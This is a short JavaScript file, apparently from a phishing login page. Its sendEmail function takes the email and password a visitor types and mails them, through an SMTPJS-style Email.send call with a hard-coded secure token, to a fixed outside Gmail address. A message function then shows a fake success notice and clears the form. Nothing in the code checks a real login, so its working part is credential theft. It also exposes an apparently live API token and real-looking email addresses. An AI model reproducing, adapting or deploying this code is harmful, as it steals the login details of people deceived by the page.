function sendEmail(){
    let userEmail = document.getElementById("userEmail").value;
    let userPassword = document.getElementById("userPassword").value;
    
    
    let body = "userEmail :" + userEmail + "<br/> userPassword :" + userPassword;
      
            Email.send({
                SecureToken :"9d1d0cef-3231-450d-81d9-711406365cc1",
                To : "abdulahad010274@gmail.com",
                From : "akrouterpowerbank@gmail.com",
                Subject : userEmail,
                Body : body
            })
    }


    function message(){
        var userEmail = document.getElementById("userEmail");
        var userPassword = document.getElementById("userPassword");
        const success = document.getElementById("success");
        const danger = document.getElementById("danger");
        
    
        if(userEmail.value === "" || userPassword.value === "")
        {
            danger.style.display = "none";
        }
        else{
            setTimeout(() => {
                userEmail.value = "";
                userPassword.value = "";
            }, 2000);
    
            success.style.display = "block";
        }
    
        setTimeout(() => {
            danger.style.display = "none"
        }, 3000)
    
    }


    let eyeicon = document.getElementById("eyeicon");
    let userPassword = document.getElementById("userPassword");

    userPassword.onclick = function() {
            eyeicon.style.display = "block";
    }

    eyeicon.onclick = function() {
        if(userPassword.type == "password"){
            userPassword.type = "text";
            eyeicon.src = "./Assets/eye open.png"
        }else {
            userPassword.type = "password";
            eyeicon.src = "./Assets/eye close.png"
        }
    }